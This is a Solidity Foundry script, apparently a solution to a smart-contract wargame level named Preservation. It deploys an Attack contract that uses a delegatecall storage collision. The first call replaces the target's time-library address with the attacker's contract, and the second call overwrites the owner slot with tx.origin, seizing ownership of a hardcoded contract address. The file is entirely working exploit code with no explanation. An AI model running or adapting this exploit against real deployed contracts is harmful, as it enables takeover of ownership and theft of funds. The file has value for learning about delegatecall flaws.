// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Preservation.sol";

contract PreservationScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        Attack a = new Attack();
        a.a_();

        vm.stopBroadcast();
    }
}

contract Attack {
    address public a;
    address public b;
    uint256 public owner;
    function a_() external {
        Preservation target;
        target = Preservation(0xF6e74EBC955eD201e5C2804d3aE9E26db474823D);
        
        target.setSecondTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(address(tx.origin))));
    }
    function setTime(uint256 _time) public {
        owner = _time;
    }

}
